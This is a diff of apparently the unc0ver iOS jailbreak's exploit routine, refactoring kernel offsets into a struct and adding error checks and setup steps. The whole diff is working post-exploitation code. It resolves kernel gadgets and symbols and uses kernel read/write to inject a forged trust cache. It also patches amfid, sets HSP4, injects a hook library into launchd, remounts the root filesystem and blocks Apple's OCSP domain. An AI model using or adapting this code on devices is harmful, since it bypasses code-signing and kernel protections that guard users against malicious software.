@@ -692,7 +692,7 @@ uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
     return vfs_context;
 }
 
-int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context, uint64_t vnode_lookup){
+int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
     size_t len = strlen(path) + 1;
     uint64_t vnode = kmem_alloc(sizeof(uint64_t));
     uint64_t ks = kmem_alloc(len);
@@ -707,13 +707,13 @@ int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_conte
     return 0;
 }
 
-int _vnode_put(uint64_t vnode, uint64_t vnode_put){
+int _vnode_put(uint64_t vnode_put, uint64_t vnode){
     return (int)kexecute(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
 }
 
 uint64_t getVnodeAtPath(uint64_t vfs_context, char *path, uint64_t vnode_lookup){
     uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
-    int ret = _vnode_lookup(path, O_RDONLY, vpp, vfs_context, vnode_lookup);
+    int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
     if (ret != 0){
         printf("unable to get vnode from path for %s\n", path);
         return -1;
@@ -929,23 +929,33 @@ mach_port_t try_restore_port() {
     return MACH_PORT_NULL;
 }
 
+typedef struct {
+    kptr_t trust_chain;
+    kptr_t amficache;
+    kptr_t OSBoolean_True;
+    kptr_t OSBoolean_False;
+    kptr_t osunserializexml;
+    kptr_t smalloc;
+    kptr_t allproc;
+    kptr_t add_x0_x0_0x40_ret;
+    kptr_t rootvnode;
+    kptr_t zone_map_ref;
+    kptr_t vfs_context_current;
+    kptr_t vnode_lookup;
+    kptr_t vnode_put;
+    kptr_t vnode_getfromfd;
+    kptr_t vnode_getattr;
+    kptr_t SHA1Init;
+    kptr_t SHA1Update;
+    kptr_t SHA1Final;
+    kptr_t csblob_entitlements_dictionary_set;
+} offsets_t;
+
 void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce, int disable_auto_updates)
 {
     // Initialize variables.
     int rv = 0;
-    uint64_t trust_chain = 0;
-    uint64_t amficache = 0;
-    uint64_t OSBoolean_True = 0;
-    uint64_t OSBoolean_False = 0;
-    uint64_t osunserializexml = 0;
-    uint64_t smalloc = 0;
-    uint64_t allproc = 0;
-    uint64_t add_x0_x0_0x40_ret = 0;
-    uint64_t rootvnode = 0;
-    uint64_t zone_map_ref = 0;
-    uint64_t vfs_context_current = 0;
-    uint64_t vnode_lookup = 0;
-    uint64_t vnode_put = 0;
+    offsets_t offsets = { 0 };
     NSMutableDictionary *md = nil;
     uint64_t vfs_context = 0;
     uint64_t devVnode = 0;
@@ -954,6 +964,8 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     uint64_t v_mount = 0;
     uint32_t v_flag = 0;
     FILE *a = NULL;
+    int fd = 0;
+    int i = 0;
     char *dev_path = NULL;
     
     {
@@ -981,33 +993,45 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         
         LOG("Finding offsets...");
         
-        trust_chain = find_trustcache();
-        LOG("trust_chain: " ADDR "\n", trust_chain);
-        amficache = find_amficache();
-        LOG("amficache: " ADDR "\n", amficache);
-        OSBoolean_True = find_OSBoolean_True();
-        LOG("OSBoolean_True: " ADDR "\n", OSBoolean_True);
-        OSBoolean_False = find_OSBoolean_False();
-        LOG("OSBoolean_False: " ADDR "\n", OSBoolean_False);
-        osunserializexml = find_osunserializexml();
-        LOG("osunserializexml: " ADDR "\n", osunserializexml);
-        smalloc = find_smalloc();
-        LOG("smalloc: " ADDR "\n", smalloc);
-        allproc = find_allproc();
-        LOG("allproc: " ADDR "\n", allproc);
-        add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
-        LOG("add_x0_x0_0x40_ret: " ADDR "\n", add_x0_x0_0x40_ret);
-        rootvnode = find_rootvnode();
-        LOG("rootvnode: " ADDR "\n", rootvnode);
-        zone_map_ref = find_zone_map_ref();
-        LOG("zone_map_ref: " ADDR "\n", zone_map_ref);
-        vfs_context_current = find_vfs_context_current();
-        LOG("vfs_context_current: " ADDR "\n", vfs_context_current);
-        vnode_lookup = find_vnode_lookup();
-        LOG("vnode_lookup: " ADDR "\n", vnode_lookup);
-        vnode_put = find_vnode_put();
-        LOG("vnode_put: " ADDR "\n", vnode_put);
-        _assert(trust_chain && amficache && OSBoolean_True && OSBoolean_False && osunserializexml && smalloc && allproc && add_x0_x0_0x40_ret && rootvnode && zone_map_ref && vfs_context_current && vnode_lookup && vnode_put);
+        offsets.trust_chain = find_trustcache();
+        LOG("trust_chain: " ADDR "\n", offsets.trust_chain);
+        offsets.amficache = find_amficache();
+        LOG("amficache: " ADDR "\n", offsets.amficache);
+        offsets.OSBoolean_True = find_OSBoolean_True();
+        LOG("OSBoolean_True: " ADDR "\n", offsets.OSBoolean_True);
+        offsets.OSBoolean_False = find_OSBoolean_False();
+        LOG("OSBoolean_False: " ADDR "\n", offsets.OSBoolean_False);
+        offsets.osunserializexml = find_osunserializexml();
+        LOG("osunserializexml: " ADDR "\n", offsets.osunserializexml);
+        offsets.smalloc = find_smalloc();
+        LOG("smalloc: " ADDR "\n", offsets.smalloc);
+        offsets.allproc = find_allproc();
+        LOG("allproc: " ADDR "\n", offsets.allproc);
+        offsets.add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
+        LOG("add_x0_x0_0x40_ret: " ADDR "\n", offsets.add_x0_x0_0x40_ret);
+        offsets.rootvnode = find_rootvnode();
+        LOG("rootvnode: " ADDR "\n", offsets.rootvnode);
+        offsets.zone_map_ref = find_zone_map_ref();
+        LOG("zone_map_ref: " ADDR "\n", offsets.zone_map_ref);
+        offsets.vfs_context_current = find_vfs_context_current();
+        LOG("vfs_context_current: " ADDR "\n", offsets.vfs_context_current);
+        offsets.vnode_lookup = find_vnode_lookup();
+        LOG("vnode_lookup: " ADDR "\n", offsets.vnode_lookup);
+        offsets.vnode_put = find_vnode_put();
+        LOG("vnode_put: " ADDR "\n", offsets.vnode_put);
+        offsets.vnode_getfromfd = find_vnode_getfromfd();
+        LOG("vnode_getfromfd: " ADDR "\n", offsets.vnode_getfromfd);
+        offsets.vnode_getattr = find_vnode_getattr();
+        LOG("vnode_getattr: " ADDR "\n", offsets.vnode_getattr);
+        offsets.SHA1Init = find_SHA1Init();
+        LOG("SHA1Init: " ADDR "\n", offsets.SHA1Init);
+        offsets.SHA1Update = find_SHA1Update();
+        LOG("SHA1Update: " ADDR "\n", offsets.SHA1Update);
+        offsets.SHA1Final = find_SHA1Final();
+        LOG("SHA1Final: " ADDR "\n", offsets.SHA1Final);
+        offsets.csblob_entitlements_dictionary_set = find_csblob_entitlements_dictionary_set();
+        LOG("csblob_entitlements_dictionary_set: " ADDR "\n", offsets.csblob_entitlements_dictionary_set);
+        _assert(offsets.trust_chain && offsets.amficache && offsets.OSBoolean_True && offsets.OSBoolean_False && offsets.osunserializexml && offsets.smalloc && offsets.allproc && offsets.add_x0_x0_0x40_ret && offsets.rootvnode && offsets.zone_map_ref && offsets.vfs_context_current && offsets.vnode_lookup && offsets.vnode_put && offsets.vnode_getfromfd && offsets.vnode_getattr && offsets.SHA1Init && offsets.SHA1Update && offsets.SHA1Final && offsets.csblob_entitlements_dictionary_set);
         
         LOG("Successfully found offsets.");
     }
@@ -1047,7 +1071,10 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
         }
-        rv = fclose(fopen("/var/mobile/test.txt", "w"));
+        a = fopen("/var/mobile/test.txt", "w");
+        LOG("a: " "%p" "\n", a);
+        _assert(a != NULL);
+        rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         rv = chmod("/var/mobile/test.txt", 0755);
@@ -1098,6 +1125,9 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Set boot-nonce.
         
         LOG("Setting boot-nonce...");
+        rv = execCommandAndWait("/usr/sbin/nvram", "IONVRAM-DELETE-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
         rv = execCommandAndWait("/usr/sbin/nvram", strdup([[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String]), NULL, NULL, NULL, NULL);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
@@ -1121,7 +1151,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Initialize kexecute.
         
         LOG("Initializing kexecute...");
-        init_kexecute(add_x0_x0_0x40_ret);
+        init_kexecute(offsets.add_x0_x0_0x40_ret);
         LOG("Successfully initialized kexecute.");
     }
     
@@ -1129,7 +1159,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Get vfs_context.
         
         LOG("Getting vfs_context...");
-        vfs_context = _vfs_context(vfs_context_current, zone_map_ref);
+        vfs_context = _vfs_context(offsets.vfs_context_current, offsets.zone_map_ref);
         LOG("vfs_context: " ADDR "\n", vfs_context);
         _assert(vfs_context);
         LOG("Successfully got vfs_context.");
@@ -1139,7 +1169,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Get dev vnode.
         
         LOG("Getting dev vnode...");
-        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", vnode_lookup);
+        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", offsets.vnode_lookup);
         LOG("devVnode: " ADDR "\n", devVnode);
         _assert(devVnode);
         LOG("Successfully got dev vnode.");
@@ -1157,7 +1187,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Clean up dev vnode.
         
         LOG("Cleaning up dev vnode...");
-        rv = _vnode_put(devVnode, vnode_put);
+        rv = _vnode_put(offsets.vnode_put, devVnode);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Successfully cleaned up dev vnode.");
@@ -1175,7 +1205,15 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Remount RootFS.
         
         LOG("Remounting RootFS...");
-        if (snapshot_list(open("/", O_RDONLY, 0)) == -1) {
+        fd = open("/", O_RDONLY, 0);
+        LOG("fd: " "%d" "\n", fd);
+        _assert(fd > 0);
+        i = snapshot_list(fd);
+        LOG("i: " "%d" "\n", rv);
+        rv = close(fd);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        if (i == -1) {
             if (!access("/var/tmp/rootfsmnt", F_OK)) {
                 rv = rmdir("/var/tmp/rootfsmnt");
                 LOG("rv: " "%d" "\n", rv);
@@ -1199,7 +1237,16 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             // Rename system snapshot.
             
             LOG("Renaming system snapshot...");
-            rv = fs_snapshot_rename(open("/var/tmp/rootfsmnt", O_RDONLY, 0), systemSnapshot(copyBootHash()), "orig-fs", 0);
+            fd = open("/var/tmp/rootfsmnt", O_RDONLY, 0);
+            LOG("fd: " "%d" "\n", fd);
+            _assert(fd > 0);
+            rv = fs_snapshot_rename(fd, systemSnapshot(copyBootHash()), "orig-fs", 0);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(errno == 2 || rv == 0);
+            rv = fs_snapshot_create(fd, "orig-fs", 0);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(errno == 17 || rv == 0);
+            rv = close(fd);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
             LOG("Successfully renamed system snapshot.");
@@ -1212,7 +1259,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             _assert(rv == 0);
             LOG("Successfully rebooted.");
         }
-        _rootvnode = rootvnode;
+        _rootvnode = offsets.rootvnode;
         rootfs_vnode = rk64(_rootvnode);
         v_mount = rk64(rootfs_vnode + 0xd8);
         v_flag = rk32(v_mount + 0x70);
@@ -1237,7 +1284,10 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
         }
-        rv = fclose(fopen("/test.txt", "w"));
+        a = fopen("/test.txt", "w");
+        LOG("a: " "%p" "\n", a);
+        _assert(a != NULL);
+        rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         rv = chmod("/test.txt", 0755);
@@ -1265,7 +1315,13 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             // Rename system snapshot.
             
             LOG("Renaming system snapshot back...");
-            rv = fs_snapshot_rename(open("/", O_RDONLY, 0), "orig-fs", systemSnapshot(copyBootHash()), 0);
+            fd = open("/", O_RDONLY, 0);
+            LOG("fd: " "%d" "\n", fd);
+            _assert(fd > 0);
+            rv = fs_snapshot_rename(fd, "orig-fs", systemSnapshot(copyBootHash()), 0);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            rv = close(fd);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
             LOG("Successfully renamed system snapshot back.");
@@ -1313,7 +1369,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"amfid_payload" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "amfid_payload");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1332,7 +1388,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"launchctl" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "launchctl");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1366,7 +1422,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"jailbreakd" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "jailbreakd");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1385,7 +1441,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"libjailbreak" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "libjailbreak");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1404,7 +1460,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"pspawn_hook" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "pspawn_hook");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1423,7 +1479,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"tar" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "tar");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1442,7 +1498,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"gzip" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a);
+        _assert(a != NULL);
         untar(a, "gzip");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
@@ -1474,14 +1530,14 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     {
         // Inject trust cache
         
-        printf("trust_chain = 0x%llx\n", trust_chain);
+        printf("trust_chain = 0x%llx\n", offsets.trust_chain);
         
         struct trust_mem mem;
-        mem.next = rk64(trust_chain);
+        mem.next = rk64(offsets.trust_chain);
         *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
         *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
         
-        rv = grab_hashes("/jb", kread, amficache, mem.next);
+        rv = grab_hashes("/jb", kread, offsets.amficache, mem.next);
         printf("rv = %d, numhash = %d\n", rv, numhash);
         
         size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
@@ -1491,7 +1547,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         mem.count = numhash;
         kwrite(kernel_trust, &mem, sizeof(mem));
         kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
-        wk64(trust_chain, kernel_trust);
+        wk64(offsets.trust_chain, kernel_trust);
         
         free(allhash);
         free(allkern);
@@ -1515,6 +1571,26 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     }
     
     {
+        // Log slide.
+        
+        LOG("Logging slide...");
+        a = fopen("/tmp/slide.txt", "w+");
+        LOG("a: " "%p" "\n", a);
+        _assert(a != NULL);
+        fprintf(a, ADDR "\n", kernel_base - KERNEL_SEARCH_ADDRESS);
+        rv = chmod("/tmp/slide.txt", 0755);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        rv = chown("/tmp/slide.txt", 0, 0);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        rv = fclose(a);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        LOG("Successfully logged slide.");
+    }
+    
+    {
         // Patch amfid.
         
         LOG("Patching amfid...");
@@ -1532,7 +1608,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Set HSP4.
         
         LOG("Setting HSP4...");
-        rv = remap_tfp0_set_hsp4(&tfp0, zone_map_ref);
+        rv = remap_tfp0_set_hsp4(&tfp0, offsets.zone_map_ref);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Successfully set HSP4.");
@@ -1562,15 +1638,25 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         _assert(md);
         md[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@ADDR, kernel_base];
         md[@"EnvironmentVariables"][@"KernProcAddr"] = [NSString stringWithFormat:@ADDR, rk64(findKernelSymbol("_kernproc"))];
-        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
-        md[@"EnvironmentVariables"][@"AddRetGadget"] = [NSString stringWithFormat:@ADDR, add_x0_x0_0x40_ret];
-        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = [NSString stringWithFormat:@ADDR, OSBoolean_True];
-        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = [NSString stringWithFormat:@ADDR, OSBoolean_False];
-        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = [NSString stringWithFormat:@ADDR, osunserializexml];
-        md[@"EnvironmentVariables"][@"Smalloc"] = [NSString stringWithFormat:@ADDR, smalloc];
+        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, offsets.zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
+        md[@"EnvironmentVariables"][@"AddRetGadget"] = [NSString stringWithFormat:@ADDR, offsets.add_x0_x0_0x40_ret];
+        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = [NSString stringWithFormat:@ADDR, offsets.OSBoolean_True];
+        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = [NSString stringWithFormat:@ADDR, offsets.OSBoolean_False];
+        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = [NSString stringWithFormat:@ADDR, offsets.osunserializexml];
+        md[@"EnvironmentVariables"][@"Smalloc"] = [NSString stringWithFormat:@ADDR, offsets.smalloc];
         rv = [md writeToFile:@"/jb/jailbreakd.plist" atomically:YES];
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 1);
+        if (!access("/var/log/jailbreakd-stderr.log", F_OK)) {
+            rv = unlink("/var/log/jailbreakd-stderr.log");
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+        }
+        if (!access("/var/log/jailbreakd-stdout.log", F_OK)) {
+            rv = unlink("/var/log/jailbreakd-stdout.log");
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+        }
         rv = execCommandAndWait("/bin/launchctl", "load", "/jb/jailbreakd.plist", NULL, NULL, NULL);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
@@ -1594,6 +1680,21 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         _assert(rv == 0);
         LOG("Patching launchd...");
         if (load_tweaks) {
+            if (!access("/var/log/pspawn_hook_launchd.log", F_OK)) {
+                rv = unlink("/var/log/pspawn_hook_launchd.log");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (!access("/var/log/pspawn_hook_xpcproxy.log", F_OK)) {
+                rv = unlink("/var/log/pspawn_hook_xpcproxy.log");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
+            if (!access("/var/log/pspawn_hook_other.log", F_OK)) {
+                rv = unlink("/var/log/pspawn_hook_other.log");
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
             rv = inject_library(1, "/usr/lib/pspawn_hook.dylib");
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
@@ -1634,6 +1735,30 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = execCommandAndWait("/jb/tar", "-xvpkf", "/var/tmp/strap.tar", NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 512 || rv == 0);
+            a = fopen("/var/lib/dpkg/available", "w");
+            LOG("a: " "%p" "\n", a);
+            _assert(a != NULL);
+            rv = fclose(a);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            rv = chmod("/var/lib/dpkg/available", 0755);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            rv = chown("/var/lib/dpkg/available", 0, 0);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            rv = mkdir("/etc/rc.d", 0755);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            rv = chown("/etc/rc.d", 0, 0);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+            a = fopen("/.installed_unc0ver", "w");
+            LOG("a: " "%p" "\n", a);
+            _assert(a != NULL);
+            rv = fclose(a);
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
             rv = fclose(fopen("/.installed_unc0ver", "w"));
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
@@ -1659,7 +1784,10 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         
         LOG("Disabling stashing...");
         if (access("/.cydia_no_stash", F_OK)) {
-            rv = fclose(fopen("/.cydia_no_stash", "w"));
+            a = fopen("/.cydia_no_stash", "w");
+            LOG("a: " "%p" "\n", a);
+            _assert(a != NULL);
+            rv = fclose(a);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
             rv = chmod("/.cydia_no_stash", 0755);
@@ -1676,9 +1804,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Block ocsp.apple.com.
         
         LOG("Blocking ocsp.apple.com...");
-        LOG("%s", readFile("/etc/hosts"));
         blockDomainWithName("ocsp.apple.com");
-        LOG("%s", readFile("/etc/hosts"));
         LOG("Successfully blocked ocsp.apple.com.");
     }
     
